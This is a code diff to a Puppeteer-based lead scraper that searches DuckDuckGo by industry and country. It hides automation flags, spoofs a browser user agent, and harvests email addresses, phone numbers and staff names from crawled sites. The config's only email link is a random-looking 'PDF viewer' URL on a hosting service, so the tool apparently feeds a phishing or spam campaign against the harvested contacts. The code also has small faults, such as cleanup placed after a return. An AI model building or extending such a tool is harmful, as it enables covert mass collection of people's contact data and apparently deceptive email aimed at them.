@@ -111,6 +111,17 @@ function selectBestSenderName(lead) {
   return 'Our Team';
 }
 
+// Function to get multiple random country codes from the CONFIG.countryCodes object
+function getMultipleRandomCountryCodes(count = 1) {
+  const countryCodes = Object.keys(CONFIG.countryCodes);
+  if (countryCodes.length === 0) {
+    return []; // No country codes available
+  }
+
+  const shuffled = countryCodes.sort(() => 0.5 - Math.random());
+  return shuffled.slice(0, Math.min(count, countryCodes.length));
+}
+
 // ---------- CONFIG ----------
 const CONFIG = {
   genericNames: [
@@ -295,6 +306,8 @@ const CONFIG = {
   emailLinks: [
     "https://pdfviewerimg133929edhe778338393.vercel.app/",
   ],
+  defaultCountryCode: null, // Set to a country code like 'US', 'GB', etc., to filter searches by country. Set to null for global search.
+  defaultDialingCode: null, // Set to a dialing code like '+1', '+44', etc., to filter searches by dialing code. Set to null for no dialing code filter.
   searchTlds: [
     '.com', '.org', '.net', '.io', '.co', '.ad', '.ae', '.af', '.ag', '.al',
     '.am', '.ao', '.ar', '.at', '.au', '.az', '.ba', '.bb', '.bd', '.be',
@@ -318,6 +331,337 @@ const CONFIG = {
     '.uy', '.uz', '.va', '.vc', '.ve', '.vn', '.vu', '.ws', '.ye', '.za',
     '.zm', '.zw'
   ],
+  countryCodes: {
+    'US': 'United States', 'CA': 'Canada', 'GB': 'United Kingdom', 'AU': 'Australia', 'DE': 'Germany',
+    'FR': 'France', 'JP': 'Japan', 'IN': 'India', 'BR': 'Brazil', 'CN': 'China',
+    'ES': 'Spain', 'IT': 'Italy', 'NL': 'Netherlands', 'SE': 'Sweden', 'CH': 'Switzerland',
+    'MX': 'Mexico', 'SG': 'Singapore', 'NZ': 'New Zealand', 'IE': 'Ireland', 'ZA': 'South Africa',
+    'AE': 'United Arab Emirates', 'AR': 'Argentina', 'AT': 'Austria', 'BE': 'Belgium', 'CL': 'Chile',
+    'CO': 'Colombia', 'DK': 'Denmark', 'FI': 'Finland', 'GR': 'Greece', 'HK': 'Hong Kong',
+    'ID': 'Indonesia', 'IL': 'Israel', 'KR': 'South Korea', 'MY': 'Malaysia', 'NO': 'Norway',
+    'PH': 'Philippines', 'PL': 'Poland', 'PT': 'Portugal', 'RU': 'Russia', 'SA': 'Saudi Arabia',
+    'TH': 'Thailand', 'TR': 'Turkey', 'TW': 'Taiwan', 'VN': 'Vietnam',
+    'NG': 'Nigeria', 'GH': 'Ghana', 'KE': 'Kenya',
+    'EG': 'Egypt', 'PK': 'Pakistan', 'BD': 'Bangladesh', 'PE': 'Peru', 'VE': 'Venezuela',
+    'UA': 'Ukraine', 'CZ': 'Czech Republic', 'HU': 'Hungary', 'RO': 'Romania', 'BG': 'Bulgaria',
+    'HR': 'Croatia', 'RS': 'Serbia', 'SK': 'Slovakia', 'SI': 'Slovenia', 'LT': 'Lithuania',
+    'LV': 'Latvia', 'EE': 'Estonia', 'MA': 'Morocco', 'DZ': 'Algeria', 'TN': 'Tunisia',
+    'ET': 'Ethiopia', 'TZ': 'Tanzania', 'UG': 'Uganda', 'KZ': 'Kazakhstan', 'UZ': 'Uzbekistan',
+    'MN': 'Mongolia', 'LK': 'Sri Lanka', 'NP': 'Nepal', 'FJ': 'Fiji', 'PG': 'Papua New Guinea',
+      'AF': 'Afghanistan', 'AL': 'Albania', 'AD': 'Andorra', 'AO': 'Angola',
+  'AM': 'Armenia', 'AZ': 'Azerbaijan', 'BH': 'Bahrain', 'BY': 'Belarus',
+  'BZ': 'Belize', 'BJ': 'Benin', 'BT': 'Bhutan', 'BA': 'Bosnia and Herzegovina',
+  'BW': 'Botswana', 'BN': 'Brunei', 'BF': 'Burkina Faso', 'BI': 'Burundi',
+  'KH': 'Cambodia', 'CM': 'Cameroon', 'CV': 'Cape Verde',
+  'CF': 'Central African Republic', 'TD': 'Chad', 'KM': 'Comoros',
+  'CG': 'Congo (Brazzaville)', 'CD': 'Congo (Kinshasa)', 'CR': 'Costa Rica',
+  'CI': "Côte d'Ivoire", 'CU': 'Cuba', 'CY': 'Cyprus',
+  'DJ': 'Djibouti', 'DM': 'Dominica', 'DO': 'Dominican Republic',
+  'EC': 'Ecuador', 'SV': 'El Salvador', 'GQ': 'Equatorial Guinea',
+  'ER': 'Eritrea', 'SZ': 'Eswatini', 'GA': 'Gabon',
+  'GM': 'Gambia', 'GE': 'Georgia', 'GD': 'Grenada',
+  'GT': 'Guatemala', 'GN': 'Guinea', 'GW': 'Guinea-Bissau',
+  'GY': 'Guyana', 'HT': 'Haiti', 'HN': 'Honduras',
+  'IS': 'Iceland', 'IQ': 'Iraq', 'IR': 'Iran',
+  'JM': 'Jamaica', 'JO': 'Jordan', 'KG': 'Kyrgyzstan',
+  'LA': 'Laos', 'LB': 'Lebanon', 'LS': 'Lesotho',
+  'LR': 'Liberia', 'LY': 'Libya', 'LI': 'Liechtenstein',
+  'LU': 'Luxembourg', 'MG': 'Madagascar', 'MW': 'Malawi',
+  'MV': 'Maldives', 'ML': 'Mali', 'MT': 'Malta',
+  'MH': 'Marshall Islands', 'MR': 'Mauritania', 'MU': 'Mauritius',
+  'FM': 'Micronesia', 'MD': 'Moldova', 'MC': 'Monaco',
+  'ME': 'Montenegro', 'MZ': 'Mozambique', 'MM': 'Myanmar',
+  'NA': 'Namibia', 'NR': 'Nauru', 'NI': 'Nicaragua',
+  'NE': 'Niger', 'MK': 'North Macedonia', 'OM': 'Oman',
+  'PW': 'Palau', 'PA': 'Panama', 'PY': 'Paraguay',
+  'QA': 'Qatar', 'RW': 'Rwanda', 'KN': 'Saint Kitts and Nevis',
+  'LC': 'Saint Lucia', 'VC': 'Saint Vincent and the Grenadines',
+  'WS': 'Samoa', 'SM': 'San Marino', 'ST': 'Sao Tome and Principe',
+  'SN': 'Senegal', 'SC': 'Seychelles', 'SL': 'Sierra Leone',
+  'SB': 'Solomon Islands', 'SO': 'Somalia', 'SS': 'South Sudan',
+  'LK': 'Sri Lanka', 'SD': 'Sudan', 'SR': 'Suriname',
+  'SY': 'Syria', 'TJ': 'Tajikistan', 'TL': 'Timor-Leste',
+  'TG': 'Togo', 'TO': 'Tonga', 'TT': 'Trinidad and Tobago',
+  'TM': 'Turkmenistan', 'TV': 'Tuvalu', 'UY': 'Uruguay',
+  'VU': 'Vanuatu', 'VA': 'Vatican City', 'YE': 'Yemen',
+  'ZM': 'Zambia', 'ZW': 'Zimbabwe'
+  },
+  countryTldMapping: {
+    'US': ['.com', '.org', '.net', '.us'],
+    'CA': ['.ca', '.com', '.org', '.net'],
+    'GB': ['.co.uk', '.org.uk', '.uk', '.com'],
+    'AU': ['.com.au', '.net.au', '.org.au', '.au'],
+    'DE': ['.de', '.com', '.org', '.net'],
+    'FR': ['.fr', '.com', '.org', '.net'],
+    'JP': ['.jp', '.co.jp', '.or.jp', '.ne.jp', '.com'],
+    'IN': ['.in', '.co.in', '.org.in', '.net.in', '.com'],
+    'BR': ['.br', '.com.br', '.org.br', '.net.br', '.com'],
+    'CN': ['.cn', '.com.cn', '.org.cn', '.net.cn', '.com'],
+    'ES': ['.es', '.com', '.org', '.net'],
+    'IT': ['.it', '.com', '.org', '.net'],
+    'NL': ['.nl', '.com', '.org', '.net'],
+    'SE': ['.se', '.com', '.org', '.net'],
+    'CH': ['.ch', '.com', '.org', '.net'],
+    'MX': ['.mx', '.com.mx', '.org.mx', '.net.mx', '.com'],
+    'SG': ['.sg', '.com.sg', '.org.sg', '.net.sg', '.com'],
+    'NZ': ['.nz', '.co.nz', '.org.nz', '.net.nz', '.com'],
+    'IE': ['.ie', '.com', '.org', '.net'],
+    'ZA': ['.co.za', '.org.za', '.net.za', '.za', '.com'],
+    'AE': ['.ae', '.com', '.org', '.net'],
+    'AR': ['.ar', '.com.ar', '.org.ar', '.net.ar', '.com'],
+    'AT': ['.at', '.com', '.org', '.net'],
+    'BE': ['.be', '.com', '.org', '.net'],
+    'CL': ['.cl', '.com.cl', '.org.cl', '.net.cl', '.com'],
+    'CO': ['.co', '.com.co', '.org.co', '.net.co'],
+    'DK': ['.dk', '.com', '.org', '.net'],
+    'FI': ['.fi', '.com', '.org', '.net'],
+    'GR': ['.gr', '.com.gr', '.org.gr', '.net.gr', '.com'],
+    'HK': ['.hk', '.com.hk', '.org.hk', '.net.hk', '.com'],
+    'ID': ['.id', '.co.id', '.or.id', '.net.id', '.com'],
+    'IL': ['.il', '.co.il', '.org.il', '.net.il', '.com'],
+    'KR': ['.kr', '.co.kr', '.or.kr', '.ne.kr', '.com'],
+    'MY': ['.my', '.com.my', '.org.my', '.net.my', '.com'],
+    'NO': ['.no', '.com', '.org', '.net'],
+    'PH': ['.ph', '.com.ph', '.org.ph', '.net.ph', '.com'],
+    'PL': ['.pl', '.com.pl', '.org.pl', '.net.pl', '.com'],
+    'PT': ['.pt', '.com.pt', '.org.pt', '.net.pt', '.com'],
+    'RU': ['.ru', '.com', '.org', '.net'],
+    'SA': ['.sa', '.com.sa', '.org.sa', '.net.sa', '.com'],
+    'TH': ['.th', '.co.th', '.or.th', '.net.th', '.com'],
+    'TR': ['.tr', '.com.tr', '.org.tr', '.net.tr', '.com'],
+    'TW': ['.tw', '.com.tw', '.org.tw', '.net.tw', '.com'],
+    'VN': ['.vn', '.com.vn', '.org.vn', '.net.vn', '.com'],
+    'NG': ['.ng', '.com.ng', '.org.ng', '.net.ng', '.com'],
+    'GH': ['.gh', '.com.gh', '.org.gh', '.net.gh', '.com'],
+    'KE': ['.ke', '.co.ke', '.or.ke', '.ne.ke', '.com'],
+    'EG': ['.eg', '.com.eg', '.org.eg', '.net.eg', '.com'],
+    'PK': ['.pk', '.com.pk', '.org.pk', '.net.pk', '.com'],
+    'BD': ['.bd', '.com.bd', '.org.bd', '.net.bd', '.com'],
+    'PE': ['.pe', '.com.pe', '.org.pe', '.net.pe', '.com'],
+    'VE': ['.ve', '.com.ve', '.org.ve', '.net.ve', '.com'],
+    'UA': ['.ua', '.com.ua', '.org.ua', '.net.ua', '.com'],
+    'CZ': ['.cz', '.com.cz', '.org.cz', '.net.cz', '.com'],
+    'HU': ['.hu', '.co.hu', '.org.hu', '.net.hu', '.com'],
+    'RO': ['.ro', '.com.ro', '.org.ro', '.net.ro', '.com'],
+    'BG': ['.bg', '.com.bg', '.org.bg', '.net.bg', '.com'],
+    'HR': ['.hr', '.com.hr', '.org.hr', '.net.hr', '.com'],
+    'RS': ['.rs', '.com.rs', '.org.rs', '.net.rs', '.com'],
+    'SK': ['.sk', '.com.sk', '.org.sk', '.net.sk', '.com'],
+    'SI': ['.si', '.com.si', '.org.si', '.net.si', '.com'],
+    'LT': ['.lt', '.com.lt', '.org.lt', '.net.lt', '.com'],
+    'LV': ['.lv', '.com.lv', '.org.lv', '.net.lv', '.com'],
+    'EE': ['.ee', '.com.ee', '.org.ee', '.net.ee', '.com'],
+    'MA': ['.ma', '.co.ma', '.org.ma', '.net.ma', '.com'],
+    'DZ': ['.dz', '.com.dz', '.org.dz', '.net.dz', '.com'],
+    'TN': ['.tn', '.com.tn', '.org.tn', '.net.tn', '.com'],
+    'ET': ['.et', '.com.et', '.org.et', '.net.et', '.com'],
+    'TZ': ['.tz', '.co.tz', '.or.tz', '.ne.tz', '.com'],
+    'UG': ['.ug', '.co.ug', '.or.ug', '.ne.ug', '.com'],
+    'KZ': ['.kz', '.com.kz', '.org.kz', '.net.kz', '.com'],
+    'UZ': ['.uz', '.com.uz', '.org.uz', '.net.uz', '.com'],
+    'MN': ['.mn', '.com.mn', '.org.mn', '.net.mn', '.com'],
+    'LK': ['.lk', '.com.lk', '.org.lk', '.net.lk', '.com'],
+    'NP': ['.np', '.com.np', '.org.np', '.net.np', '.com'],
+    'FJ': ['.fj', '.com.fj', '.org.fj', '.net.fj', '.com'],
+    'PG': ['.pg', '.com.pg', '.org.pg', '.net.pg', '.com'],
+      'AF': ['.af', '.com', '.org', '.net'],
+  'AL': ['.al', '.com', '.org', '.net'],
+  'AD': ['.ad', '.com', '.org', '.net'],
+  'AO': ['.ao', '.co.ao', '.org.ao', '.net.ao', '.com'],
+  'AM': ['.am', '.com', '.org', '.net'],
+  'AZ': ['.az', '.com', '.org', '.net'],
+  'BH': ['.bh', '.com.bh', '.org.bh', '.net.bh', '.com'],
+  'BY': ['.by', '.com', '.org', '.net'],
+  'BZ': ['.bz', '.com.bz', '.org.bz', '.net.bz', '.com'],
+  'BJ': ['.bj', '.com', '.org', '.net'],
+  'BT': ['.bt', '.com.bt', '.org.bt', '.net.bt', '.com'],
+  'BA': ['.ba', '.com.ba', '.org.ba', '.net.ba', '.com'],
+  'BW': ['.bw', '.co.bw', '.org.bw', '.net.bw', '.com'],
+  'BN': ['.bn', '.com.bn', '.org.bn', '.net.bn', '.com'],
+  'BF': ['.bf', '.com', '.org', '.net'],
+  'BI': ['.bi', '.co.bi', '.org.bi', '.net.bi', '.com'],
+  'KH': ['.kh', '.com.kh', '.org.kh', '.net.kh', '.com'],
+  'CM': ['.cm', '.co.cm', '.org.cm', '.net.cm', '.com'],
+  'CV': ['.cv', '.com.cv', '.org.cv', '.net.cv', '.com'],
+  'CF': ['.cf', '.com.cf', '.org.cf', '.net.cf', '.com'],
+  'TD': ['.td', '.com', '.org', '.net'],
+  'KM': ['.km', '.com.km', '.org.km', '.net.km', '.com'],
+  'CG': ['.cg', '.com.cg', '.org.cg', '.net.cg', '.com'],
+  'CD': ['.cd', '.com', '.org', '.net'],
+  'CR': ['.cr', '.co.cr', '.or.cr', '.fi.cr', '.com'],
+  'CI': ['.ci', '.com.ci', '.org.ci', '.net.ci', '.com'],
+  'CU': ['.cu', '.com.cu', '.org.cu', '.net.cu', '.com'],
+  'CY': ['.cy', '.com.cy', '.org.cy', '.net.cy', '.com'],
+  'DJ': ['.dj', '.com.dj', '.org.dj', '.net.dj', '.com'],
+  'DM': ['.dm', '.com.dm', '.org.dm', '.net.dm', '.com'],
+  'DO': ['.do', '.com.do', '.org.do', '.net.do', '.com'],
+  'EC': ['.ec', '.com.ec', '.org.ec', '.net.ec', '.com'],
+  'SV': ['.sv', '.com.sv', '.org.sv', '.net.sv', '.com'],
+  'GQ': ['.gq', '.com.gq', '.org.gq', '.net.gq', '.com'],
+  'ER': ['.er', '.com.er', '.org.er', '.net.er', '.com'],
+  'SZ': ['.sz', '.co.sz', '.org.sz', '.net.sz', '.com'],
+  'GA': ['.ga', '.com.ga', '.org.ga', '.net.ga', '.com'],
+  'GM': ['.gm', '.com.gm', '.org.gm', '.net.gm', '.com'],
+  'GE': ['.ge', '.com.ge', '.org.ge', '.net.ge', '.com'],
+  'GD': ['.gd', '.com.gd', '.org.gd', '.net.gd', '.com'],
+  'GT': ['.gt', '.com.gt', '.org.gt', '.net.gt', '.com'],
+  'GN': ['.gn', '.com.gn', '.org.gn', '.net.gn', '.com'],
+  'GW': ['.gw', '.com.gw', '.org.gw', '.net.gw', '.com'],
+  'GY': ['.gy', '.com.gy', '.org.gy', '.net.gy', '.com'],
+  'HT': ['.ht', '.com.ht', '.org.ht', '.net.ht', '.com'],
+  'HN': ['.hn', '.com.hn', '.org.hn', '.net.hn', '.com'],
+  'IS': ['.is', '.com', '.org', '.net'],
+  'IQ': ['.iq', '.com.iq', '.org.iq', '.net.iq', '.com'],
+  'IR': ['.ir', '.co.ir', '.org.ir', '.net.ir', '.com'],
+  'JM': ['.jm', '.com.jm', '.org.jm', '.net.jm', '.com'],
+  'JO': ['.jo', '.com.jo', '.org.jo', '.net.jo', '.com'],
+  'KG': ['.kg', '.com.kg', '.org.kg', '.net.kg', '.com'],
+  'LA': ['.la', '.com.la', '.org.la', '.net.la', '.com'],
+  'LB': ['.lb', '.com.lb', '.org.lb', '.net.lb', '.com'],
+  'LS': ['.ls', '.co.ls', '.org.ls', '.net.ls', '.com'],
+  'LR': ['.lr', '.com.lr', '.org.lr', '.net.lr', '.com'],
+  'LY': ['.ly', '.com.ly', '.org.ly', '.net.ly', '.com'],
+  'LI': ['.li', '.com', '.org', '.net'],
+  'LU': ['.lu', '.com', '.org', '.net'],
+  'MG': ['.mg', '.com.mg', '.org.mg', '.net.mg', '.com'],
+  'MW': ['.mw', '.com.mw', '.org.mw', '.net.mw', '.com'],
+  'MV': ['.mv', '.com.mv', '.org.mv', '.net.mv', '.com'],
+  'ML': ['.ml', '.com.ml', '.org.ml', '.net.ml', '.com'],
+  'MT': ['.mt', '.com', '.org', '.net'],
+  'MH': ['.mh', '.com.mh', '.org.mh', '.net.mh', '.com'],
+  'MR': ['.mr', '.com.mr', '.org.mr', '.net.mr', '.com'],
+  'MU': ['.mu', '.co.mu', '.org.mu', '.net.mu', '.com'],
+  'FM': ['.fm', '.com.fm', '.org.fm', '.net.fm', '.com'],
+  'MD': ['.md', '.com.md', '.org.md', '.net.md', '.com'],
+  'MC': ['.mc', '.com', '.org', '.net'],
+  'ME': ['.me', '.co.me', '.org.me', '.net.me', '.com'],
+  'MZ': ['.mz', '.co.mz', '.org.mz', '.net.mz', '.com'],
+  'MM': ['.mm', '.com.mm', '.org.mm', '.net.mm', '.com'],
+  'NA': ['.na', '.com.na', '.org.na', '.net.na', '.com'],
+  'NR': ['.nr', '.com.nr', '.org.nr', '.net.nr', '.com'],
+  'NI': ['.ni', '.com.ni', '.org.ni', '.net.ni', '.com'],
+  'NE': ['.ne', '.com.ne', '.org.ne', '.net.ne', '.com'],
+  'MK': ['.mk', '.com.mk', '.org.mk', '.net.mk', '.com'],
+  'OM': ['.om', '.co.om', '.org.om', '.net.om', '.com'],
+  'PW': ['.pw', '.com.pw', '.org.pw', '.net.pw', '.com'],
+  'PA': ['.pa', '.com.pa', '.org.pa', '.net.pa', '.com'],
+  'PY': ['.py', '.com.py', '.org.py', '.net.py', '.com'],
+  'QA': ['.qa', '.com.qa', '.org.qa', '.net.qa', '.com'],
+  'RW': ['.rw', '.co.rw', '.org.rw', '.net.rw', '.com'],
+  'KN': ['.kn', '.com.kn', '.org.kn', '.net.kn', '.com'],
+  'LC': ['.lc', '.com.lc', '.org.lc', '.net.lc', '.com'],
+  'VC': ['.vc', '.com.vc', '.org.vc', '.net.vc', '.com'],
+  'WS': ['.ws', '.com.ws', '.org.ws', '.net.ws', '.com'],
+  'SM': ['.sm', '.com', '.org', '.net'],
+  'ST': ['.st', '.com.st', '.org.st', '.net.st', '.com'],
+  'SN': ['.sn', '.com.sn', '.org.sn', '.net.sn', '.com'],
+  'SC': ['.sc', '.com.sc', '.org.sc', '.net.sc', '.com'],
+  'SL': ['.sl', '.com.sl', '.org.sl', '.net.sl', '.com'],
+  'SB': ['.sb', '.com.sb', '.org.sb', '.net.sb', '.com'],
+  'SO': ['.so', '.com.so', '.org.so', '.net.so', '.com'],
+  'SS': ['.ss', '.com', '.org', '.net'],
+  'SD': ['.sd', '.com.sd', '.org.sd', '.net.sd', '.com'],
+  'SR': ['.sr', '.com.sr', '.org.sr', '.net.sr', '.com'],
+  'SY': ['.sy', '.com.sy', '.org.sy', '.net.sy', '.com'],
+  'TJ': ['.tj', '.com.tj', '.org.tj', '.net.tj', '.com'],
+  'TL': ['.tl', '.com.tl', '.org.tl', '.net.tl', '.com'],
+  'TG': ['.tg', '.com.tg', '.org.tg', '.net.tg', '.com'],
+  'TO': ['.to', '.com.to', '.org.to', '.net.to', '.com'],
+  'TT': ['.tt', '.com.tt', '.org.tt', '.net.tt', '.com'],
+  'TM': ['.tm', '.com.tm', '.org.tm', '.net.tm', '.com'],
+  'TV': ['.tv', '.com.tv', '.org.tv', '.net.tv', '.com'],
+  'UY': ['.uy', '.com.uy', '.org.uy', '.net.uy', '.com'],
+  'VU': ['.vu', '.com.vu', '.org.vu', '.net.vu', '.com'],
+  'VA': ['.va', '.com', '.org', '.net'],
+  'YE': ['.ye', '.com.ye', '.org.ye', '.net.ye', '.com'],
+  'ZM': ['.zm', '.co.zm', '.org.zm', '.net.zm', '.com'],
+  'ZW': ['.zw', '.co.zw', '.org.zw', '.net.zw', '.com']
+  },
+  countryDialingCodeMapping: {
+    'US': '+1',
+    'CA': '+1',
+    'GB': '+44',
+    'AU': '+61',
+    'DE': '+49',
+    'FR': '+33',
+    'JP': '+81',
+    'IN': '+91',
+    'BR': '+55',
+    'CN': '+86',
+    'ES': '+34',
+    'IT': '+39',
+    'NL': '+31',
+    'SE': '+46',
+    'CH': '+41',
+    'MX': '+52',
+    'SG': '+65',
+    'NZ': '+64',
+    'IE': '+353',
+    'ZA': '+27',
+    'AE': '+971',
+    'AR': '+54',
+    'AT': '+43',
+    'BE': '+32',
+    'CL': '+56',
+    'CO': '+57',
+    'DK': '+45',
+    'FI': '+358',
+    'GR': '+30',
+    'HK': '+852',
+    'ID': '+62',
+    'IL': '+972',
+    'KR': '+82',
+    'MY': '+60',
+    'NO': '+47',
+    'PH': '+63',
+    'PL': '+48',
+    'PT': '+351',
+    'RU': '+7',
+    'SA': '+966',
+    'TH': '+66',
+    'TR': '+90',
+    'TW': '+886',
+    'VN': '+84',
+    'NG': '+234',
+    'GH': '+233',
+    'KE': '+254',
+    'EG': '+20', 'PK': '+92', 'BD': '+880', 'PE': '+51', 'VE': '+58',
+    'UA': '+380', 'CZ': '+420', 'HU': '+36', 'RO': '+40', 'BG': '+359',
+    'HR': '+385', 'RS': '+381', 'SK': '+421', 'SI': '+386', 'LT': '+370',
+    'LV': '+371', 'EE': '+372', 'MA': '+212', 'DZ': '+213', 'TN': '+216',
+    'ET': '+251', 'TZ': '+255', 'UG': '+256', 'KZ': '+7', 'UZ': '+998',
+    'MN': '+976', 'LK': '+94', 'NP': '+977', 'FJ': '+679', 'PG': '+675',
+      'AF': '+93', 'AL': '+355', 'AD': '+376', 'AO': '+244',
+  'AM': '+374', 'AZ': '+994', 'BH': '+973', 'BY': '+375',
+  'BZ': '+501', 'BJ': '+229', 'BT': '+975', 'BA': '+387',
+  'BW': '+267', 'BN': '+673', 'BF': '+226', 'BI': '+257',
+  'KH': '+855', 'CM': '+237', 'CV': '+238', 'CF': '+236',
+  'TD': '+235', 'KM': '+269', 'CG': '+242', 'CD': '+243',
+  'CR': '+506', 'CI': '+225', 'CU': '+53', 'CY': '+357',
+  'DJ': '+253', 'DM': '+1', 'DO': '+1', 'EC': '+593',
+  'SV': '+503', 'GQ': '+240', 'ER': '+291', 'SZ': '+268',
+  'GA': '+241', 'GM': '+220', 'GE': '+995', 'GD': '+1',
+  'GT': '+502', 'GN': '+224', 'GW': '+245', 'GY': '+592',
+  'HT': '+509', 'HN': '+504', 'IS': '+354', 'IQ': '+964',
+  'IR': '+98', 'JM': '+1', 'JO': '+962', 'KG': '+996',
+  'LA': '+856', 'LB': '+961', 'LS': '+266', 'LR': '+231',
+  'LY': '+218', 'LI': '+423', 'LU': '+352', 'MG': '+261',
+  'MW': '+265', 'MV': '+960', 'ML': '+223', 'MT': '+356',
+  'MH': '+692', 'MR': '+222', 'MU': '+230', 'FM': '+691',
+  'MD': '+373', 'MC': '+377', 'ME': '+382', 'MZ': '+258',
+  'MM': '+95', 'NA': '+264', 'NR': '+674', 'NI': '+505',
+  'NE': '+227', 'MK': '+389', 'OM': '+968', 'PW': '+680',
+  'PA': '+507', 'PY': '+595', 'QA': '+974', 'RW': '+250',
+  'KN': '+1', 'LC': '+1', 'VC': '+1', 'WS': '+685',
+  'SM': '+378', 'ST': '+239', 'SN': '+221', 'SC': '+248',
+  'SL': '+232', 'SB': '+677', 'SO': '+252', 'SS': '+211',
+  'SD': '+249', 'SR': '+597', 'SY': '+963', 'TJ': '+992',
+  'TL': '+670', 'TG': '+228', 'TO': '+676', 'TT': '+1',
+  'TM': '+993', 'TV': '+688', 'UY': '+598', 'VU': '+678',
+  'VA': '+379', 'YE': '+967', 'ZM': '+260', 'ZW': '+263'
+  },
+
+  
 irrelevantPhrases: [
 'team member','general contact','find us','contact us','about us','our team','read more','view all','copyright','privacy policy','terms of service',
 'member','email member','send email','get in touch','reach out','inquiry','support','help','admin','administrator','info','sales','hr','human resources',
@@ -944,30 +1288,40 @@ async function findContactPage(page, websiteUrl) {
 // }
 
 // ---------- SCRAPING ----------
-async function getWebsitesByIndustry(industry, browser) {
+async function getWebsitesByIndustry(industry, browser, countryCode = null, dialingCode = null) {
   const allLinks = new Set();
-  const tldsToSearch = shuffleArray([...CONFIG.searchTlds]).slice(0, 15);
-  console.log(`Searching TLDs: ${tldsToSearch.join(', ')}`);
+  let tldsToSearch;
+
+  if (countryCode && CONFIG.countryTldMapping[countryCode]) {
+    tldsToSearch = shuffleArray([...CONFIG.countryTldMapping[countryCode]]).slice(0, 15);
+    console.log(`Searching TLDs for ${countryCode}: ${tldsToSearch.join(', ')}`);
+  } else {
+    tldsToSearch = shuffleArray([...CONFIG.searchTlds]).slice(0, 15);
+    console.log(`Searching global TLDs: ${tldsToSearch.join(', ')}`);
+  }
 
   for (const tld of tldsToSearch) {
-  let page;
+    let page;
 
-  try {
-    page = await browser.newPage();
+    try {
+      page = await browser.newPage();
 
-    await page.evaluateOnNewDocument(() => {
-      Object.defineProperty(navigator, 'webdriver', {
-        get: () => false,
+      await page.evaluateOnNewDocument(() => {
+        Object.defineProperty(navigator, 'webdriver', {
+          get: () => false,
+        });
       });
-    });
 
-    await page.setUserAgent(
-      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120 Safari/537.36'
-    );
+      await page.setUserAgent(
+        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120 Safari/537.36'
+      );
 
-    await page.setViewport({ width: 1366, height: 768 });
+      await page.setViewport({ width: 1366, height: 768 });
       // Use HTML version of DuckDuckGo and fix site search parameter
-      const query = `"${industry}" contact OR about OR "${industry}" site:${tld.substring(1)}`;
+      let query = `"${industry}" contact OR about OR "${industry}" site:${tld.substring(1)}`;
+      if (dialingCode) {
+        query += ` "${dialingCode}"`;
+      }
       const searchUrl = `https://html.duckduckgo.com/html/?q=${encodeURIComponent(query)}`;
       await page.goto(searchUrl, { waitUntil: 'domcontentloaded', timeout: 90000 });
 
@@ -1022,7 +1376,8 @@ async function getWebsitesByIndustry(industry, browser) {
 
 async function extractEmailsFromWebsite(url, browser) {
   const visited = new Set();
-  const scrapedEmails = new Set(); // Renamed to avoid conflict with combined emails
+  const scrapedEmails = new Set();
+  const scrapedPhoneNumbers = new Set(); // Declare scrapedPhoneNumbers here
   const queue = [url];
   visited.add(url);
 
@@ -1085,6 +1440,11 @@ async function extractEmailsFromWebsite(url, browser) {
           const emailRegex = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/gi;
           const foundEmails = content.match(emailRegex) || [];
           foundEmails.forEach(email => scrapedEmails.add(email)); // Scraped emails are added here
+
+          // Regex for phone numbers, including international formats
+          const phoneRegex = /(\+\d{1,3}[-.\s]?)?(\(\d{1,4}\)[-.\s]?)?(\d{1,4}[-.\s]?){2,}\d{1,4}/g;
+          const foundPhoneNumbers = content.match(phoneRegex) || [];
+          foundPhoneNumbers.forEach(phone => scrapedPhoneNumbers.add(phone));
 
 
           const links = await page.$$eval('a', as => as.map(a => a.href));
@@ -1549,7 +1909,15 @@ function isValidName(name, title, irrelevantPhrases) {
     console.log(`[INFO] No specific people scraped. Setting sender to null.`);
   }
 
-  return { emails: Array.from(scrapedEmails), domain: initialHost, companyName, scrapedPeople, sender };
+  return {
+    emails: Array.from(scrapedEmails),
+    phoneNumbers: Array.from(scrapedPhoneNumbers),
+    domain: initialHost,
+    companyName,
+    scrapedPeople,
+    sender,
+    apolloContacts
+  };
  
   // Add this line at the very end of the function
   if (page && !page.isClosed()) {
@@ -1599,23 +1967,41 @@ async function main(io) {
       for (const industry of shuffledIndustries) {
         console.log(`\nSearching websites for industry: ${industry}`);
 
-        const websites = await getWebsitesByIndustry(industry, browser);
-        console.log(`Found ${websites.length} websites for industry ${industry}.`); // Added log
+        // Randomize defaultCountryCode for each industry
+        CONFIG.countryCodesForSearch = getMultipleRandomCountryCodes(10);
+        const allWebsitesForIndustry = [];
 
-        for (const website of websites) {
+        for (const countryCode of CONFIG.countryCodesForSearch) {
+          console.log(`[INFO] Searching for industry: ${industry} in country: ${countryCode || 'Global'}`);
+
+          let dialingCodeToUse = CONFIG.defaultDialingCode;
+          if (!dialingCodeToUse && countryCode && CONFIG.countryDialingCodeMapping[countryCode]) {
+            dialingCodeToUse = CONFIG.countryDialingCodeMapping[countryCode];
+          }
+          const websites = await getWebsitesByIndustry(industry, browser, countryCode, dialingCodeToUse);
+          console.log(`Found ${websites.length} websites for industry ${industry} in country ${countryCode}.`);
+          allWebsitesForIndustry.push(...websites);
+        }
+
+        // Remove duplicates from allWebsitesForIndustry
+        const uniqueWebsitesForIndustry = [...new Set(allWebsitesForIndustry)];
+        console.log(`Total unique websites found for industry ${industry}: ${uniqueWebsitesForIndustry.length}`);
+
+        for (const website of uniqueWebsitesForIndustry) {
           if (leads.some(l => l.website === website)) {
             console.log(`Skipping already processed website: ${website}`);
             continue;
           }
 
-          const { emails, domain, companyName, scrapedPeople, sender } = await extractEmailsFromWebsite(website, browser);
+          const { emails, phoneNumbers, domain, companyName, scrapedPeople, sender } = await extractEmailsFromWebsite(website, browser);
           // A lead is valid if we found any emails (scraped or Apollo) or Apollo contacts
-          if (emails.length > 0 || scrapedPeople.length > 0) {
+          if (emails.length > 0 || phoneNumbers.length > 0 || scrapedPeople.length > 0) {
             const lead = {
               website,
               domain, // Store the extracted domain
               companyName, // Store the extracted company name
               emails, // Emails found via scraping and Apollo (excluding sender)
+              phoneNumbers, // Phone numbers found via scraping
               scrapedPeople, // All relevant Apollo contacts
               sender, // The selected sender contact from Apollo
               industry,
